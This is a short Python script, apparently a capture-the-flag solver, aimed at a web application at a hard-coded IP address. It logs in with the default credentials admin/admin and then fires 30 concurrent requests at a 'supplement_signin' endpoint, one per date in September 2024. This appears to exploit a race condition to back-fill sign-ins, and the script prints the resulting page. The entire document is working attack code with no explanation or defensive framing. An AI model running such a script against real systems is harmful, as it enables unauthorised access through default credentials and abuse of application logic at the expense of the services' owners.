
import requests
from concurrent.futures import ThreadPoolExecutor

url = 'http://27.25.151.80:45054/'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
}

def post_date(date, session):
    data = {
        'supplement_date': date
    }
    response = session.post(url + 'supplement_signin', headers=headers, data=data)


if __name__ == '__main__':
    session = requests.Session()
    session.get(url + 'signin')
    session.post(url + 'login',
                 headers=headers, data={'username': 'admin', 'password': 'admin'})
    with ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(post_date, [f'2024-09-{i:02d}' for i in range(1, 31)], [session]*30)
    response = session.get(url)
    print(response.text)
